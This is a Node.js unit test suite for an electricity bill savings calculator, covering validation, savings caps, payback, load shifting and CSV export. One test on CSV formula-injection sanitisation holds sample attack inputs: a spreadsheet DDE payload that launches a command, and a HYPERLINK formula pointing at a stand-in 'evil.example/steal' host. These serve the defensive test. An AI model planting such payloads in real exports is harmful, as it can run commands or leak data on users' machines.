/**
 * Bill-to-Savings — Comprehensive Unit Test Suite
 * Tests all formulas, edge cases, safeguards, caps, and QA requirements from Section 17.
 * Run with: node --test tests/calculator.test.js
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const Engine = require('../src/engine/calculator.js');
const DemoData = require('../src/data/demoData.js');

test('1. Missing bill values handled gracefully without inventing values', () => {
  const res = Engine.validateAndNormalizeInputs(
    { unitsConsumedKwh: 'Not available', totalBillAmount: '' },
    {},
    {}
  );
  assert.equal(res.valid, false);
  assert.ok(res.errors.some((e) => e.includes('Billed consumption (kWh) is missing')));
  assert.ok(res.errors.some((e) => e.includes('Total bill amount (₹) is missing')));
  assert.equal(res.normalized.unitsConsumedKwh, 0);
  assert.equal(res.normalized.totalBillAmount, 0);
});

test('2. Zero consumption produces zero kWh savings and appropriate warning', () => {
  const plan = Engine.generateSavingsPlan({
    bill: { unitsConsumedKwh: 0, totalBillAmount: 500 },
    tariff: { marginalRatePerKwh: 8.5, todSupported: false },
    questionnaire: DemoData.primaryDemoMeter.questionnaire
  });
  assert.equal(plan.summary.totalBilledKwh, 0);
  assert.equal(plan.summary.estimatedEnergySavedKwh, 0);
  assert.equal(plan.summary.estimatedMonthlySavingsInr, 0);
  assert.ok(plan.validation.warnings.some((w) => w.includes('0 kWh')));
});

test('3. Zero or negative savings returns "No positive payback estimated."', () => {
  const paybackZero = Engine.calculateSimplePayback(4500, 0);
  assert.equal(paybackZero.months, null);
  assert.equal(paybackZero.label, 'No positive payback estimated.');

  const paybackNegative = Engine.calculateSimplePayback(4500, -150);
  assert.equal(paybackNegative.months, null);
  assert.equal(paybackNegative.label, 'No positive payback estimated.');

  const paybackImmediate = Engine.calculateSimplePayback(0, 850);
  assert.equal(paybackImmediate.months, 0);
  assert.ok(paybackImmediate.label.includes('Immediate'));
});

test('4. Very large bill amounts trigger sanity warnings and maintain mathematical consistency', () => {
  const res = Engine.validateAndNormalizeInputs(
    { unitsConsumedKwh: 650000, totalBillAmount: 15000000 },
    { marginalRatePerKwh: 9.0 },
    {}
  );
  assert.equal(res.valid, true);
  assert.ok(res.warnings.some((w) => w.includes('Very high monthly consumption')));
  assert.ok(res.warnings.some((w) => w.includes('Very large bill amount')));
});

test('5. Invalid operating hours (>24 or <0) or invalid days (>31) rejected in equipment calculator', () => {
  const over24 = Engine.calculateEquipmentEnergy({
    powerKw: 2.0,
    quantity: 1,
    hoursPerDay: 26,
    daysPerMonth: 30
  });
  assert.equal(over24.valid, false);
  assert.ok(over24.error.includes('between 0 and 24'));

  const negativeHours = Engine.calculateEquipmentEnergy({
    powerKw: 2.0,
    quantity: 1,
    hoursPerDay: -3,
    daysPerMonth: 30
  });
  assert.equal(negativeHours.valid, false);

  const validEquip = Engine.calculateEquipmentEnergy({
    powerKw: 1.5,
    quantity: 2,
    hoursPerDay: 10,
    daysPerMonth: 30,
    dutyCycle: 1.0
  });
  assert.equal(validEquip.valid, true);
  assert.equal(validEquip.monthlyKwh, 900); // 1.5 * 2 * 10 * 30
});

test('6. Invalid or missing tariffs fall back to explicitly labelled approximate effective rate', () => {
  const res = Engine.validateAndNormalizeInputs(
    { unitsConsumedKwh: 1000, totalBillAmount: 9500 },
    { marginalRatePerKwh: null },
    {}
  );
  assert.equal(res.valid, true);
  assert.equal(res.normalized.effectiveRatePerKwh, 9.5);
  assert.equal(res.normalized.applicableRatePerKwh, 9.5);
  assert.equal(res.normalized.rateType, 'approximate_effective');
  assert.ok(res.normalized.rateLabel.includes('Approximate effective rate'));
  assert.ok(res.warnings.some((w) => w.includes('Approximate effective rate') || w.includes('approximate effective rate')));

  // Invalid negative tariff rejected
  const badTariff = Engine.validateAndNormalizeInputs(
    { unitsConsumedKwh: 1000, totalBillAmount: 9500 },
    { marginalRatePerKwh: -5 },
    {}
  );
  assert.equal(badTariff.valid, false);
});

test('7. Incorrect uploaded file types and oversized files rejected by validator', () => {
  const exeFile = Engine.validateBillUpload({ name: 'malware.exe', type: 'application/x-msdownload', size: 1024 });
  assert.equal(exeFile.valid, false);
  assert.ok(exeFile.error.includes('Unsupported file type'));

  const hugePdf = Engine.validateBillUpload({
    name: 'scan.pdf',
    type: 'application/pdf',
    size: 8 * 1024 * 1024 // 8 MB > 5 MB limit
  });
  assert.equal(hugePdf.valid, false);
  assert.ok(hugePdf.error.includes('maximum allowed size'));

  const validPng = Engine.validateBillUpload({ name: 'bill.png', type: 'image/png', size: 450000 });
  assert.equal(validPng.valid, true);
});

test('8. User-edited extracted fields update calculations accurately', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  const initialPlan = Engine.generateSavingsPlan(state);

  // User edits unitsConsumedKwh from 2400 to 1200 and totalBillAmount from 23400 to 11700
  state.bill.unitsConsumedKwh = 1200;
  state.bill.totalBillAmount = 11700;
  state.bill.energyCharges = 10200;
  const updatedPlan = Engine.generateSavingsPlan(state);

  assert.equal(updatedPlan.summary.totalBilledKwh, 1200);
  assert.ok(updatedPlan.summary.estimatedEnergySavedKwh < initialPlan.summary.estimatedEnergySavedKwh);
});

test('9. Multiple recommendations competing for the same category do not double-count', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  // Set extreme reduction assumptions for both cooling actions (e.g., 50% each)
  state.actionAssumptions = {
    'ac-setpoint-schedule': { reductionPct: 50, implementationCost: 0 },
    'ac-filter-coil-maintenance': { reductionPct: 50, implementationCost: 1500 }
  };
  const plan = Engine.generateSavingsPlan(state);
  const coolingBaseline = plan.categoryBreakdown.baselineKwh.cooling;
  const coolingSaved = plan.recommendations
    .filter((r) => r.category === 'cooling')
    .reduce((sum, r) => sum + r.savedKwh, 0);

  // Total saved in cooling must never exceed 55% category cap of cooling baseline
  assert.ok(coolingSaved <= Math.round(coolingBaseline * 0.55));
});

test('10. Overall energy-saving cap prevents implausible total kWh reductions', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  state.config.overallSavingsCapPercent = 20; // Strict 20% overall cap on 2400 kWh = max 480 kWh
  state.actionAssumptions = {
    'ac-setpoint-schedule': { reductionPct: 50 },
    'led-lighting-upgrade': { reductionPct: 60 },
    'refrigeration-gasket-coil-care': { reductionPct: 45 },
    'standby-and-unused-switch-off': { reductionPct: 50 }
  };
  const plan = Engine.generateSavingsPlan(state);
  assert.ok(plan.summary.estimatedEnergySavedKwh <= 480 + 2); // allowing 1-2 kWh rounding across items
});

test('11. Time-shifting actions produce 0 kWh energy reduction and are exempt from kWh cap', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  const plan = Engine.generateSavingsPlan(state);
  const todRec = plan.recommendations.find((r) => r.id === 'tod-load-shifting');
  assert.ok(todRec, 'ToD recommendation should be present when tariff rewards shifting');
  assert.equal(todRec.actionType, 'time_shifting');
  assert.equal(todRec.savedKwh, 0, 'Time shifting must never claim kWh energy reduction');
  assert.ok(todRec.shiftedKwh > 0, 'Shifted kWh should be positive');
  assert.ok(todRec.monthlySavingsInr > 0, 'Bill rupee savings from rate differential should be positive');

  // When tariff is flat (no differential), shifting yields ₹0 savings
  state.tariff.todSupported = false;
  const flatPlan = Engine.generateSavingsPlan(state);
  assert.equal(flatPlan.todAnalysis.rewardingTariff, false);
  assert.equal(flatPlan.todAnalysis.estimatedMonthlyBillSavings, 0);
});

test('12. Missing CO2 factor returns null CO2 reduction without inventing emissions numbers', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  state.config.co2FactorKgPerKwh = null;
  const plan = Engine.generateSavingsPlan(state);
  assert.equal(plan.summary.co2MonthlyKg, null);
  assert.equal(plan.summary.co2AnnualKg, null);
  assert.equal(plan.summary.co2FactorMeta.available, false);
});

test('13. CSV export sanitizes spreadsheet formula injection (=, +, -, @)', () => {
  assert.equal(Engine.sanitizeCsvCell('=SUM(A1:A10)'), `"'=SUM(A1:A10)"`);
  assert.equal(Engine.sanitizeCsvCell('+cmd|\' /C calc\'!A0'), `"'+cmd|' /C calc'!A0"`);
  assert.equal(Engine.sanitizeCsvCell('-2+3+cmd'), `"'-2+3+cmd"`);
  assert.equal(Engine.sanitizeCsvCell('@IMPORTXML(...)'), `"'@IMPORTXML(...)"`);

  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  state.bill.businessName = '=HYPERLINK("http://evil.example/steal", "Click")';
  const csv = Engine.generateCsvReport(state, null, { redactSensitive: true });
  assert.ok(csv.includes(`"'=HYPERLINK("`));
  assert.ok(csv.includes('[Redacted for Privacy]'));
});

test('14. Multi-meter aggregation prevents double-counting identical consumer number & period', () => {
  const m1 = {
    id: 'm1',
    meterName: 'Main Meter',
    consumerNumber: 'DEMO-09-248-1104-X',
    billingPeriod: 'Sep 2026',
    state: DemoData.primaryDemoMeter
  };
  const m1Duplicate = {
    id: 'm2',
    meterName: 'Duplicate Upload of Main Meter',
    consumerNumber: 'DEMO-09-248-1104-X',
    billingPeriod: 'Sep 2026',
    state: DemoData.primaryDemoMeter
  };
  const m2Distinct = {
    id: 'm3',
    meterName: 'Second Meter',
    consumerNumber: 'DEMO-09-248-1105-Y',
    billingPeriod: 'Sep 2026',
    state: DemoData.secondaryDemoMeter
  };

  const agg = Engine.aggregateMeters([m1, m1Duplicate, m2Distinct]);
  assert.equal(agg.meterCount, 2);
  assert.equal(agg.duplicateWarnings.length, 1);
  assert.equal(agg.totalBilledKwh, 2400 + 1100);
});

test('15. What-If Simulator filters (Top 3 lowest-cost & budget cap) and Reset work accurately', () => {
  const state = JSON.parse(JSON.stringify(DemoData.primaryDemoMeter));
  state.simulator.top3LowestCostOnly = true;
  const top3Plan = Engine.generateSavingsPlan(state);
  const includedPositive = top3Plan.recommendations.filter(
    (r) => r.includedInScenario && r.monthlySavingsInr > 0
  );
  assert.equal(includedPositive.length, 3);

  // Reset simulator
  state.simulator = {
    operatingHoursReductionPct: 0,
    installLed: true,
    optimizeCooling: true,
    enableLoadShifting: true,
    loadShiftPercentOfPeak: 30,
    budgetLimitInr: null,
    top3LowestCostOnly: false
  };
  const resetPlan = Engine.generateSavingsPlan(state);
  const allIncluded = resetPlan.recommendations.filter((r) => r.includedInScenario);
  assert.equal(allIncluded.length, resetPlan.recommendations.length);
});
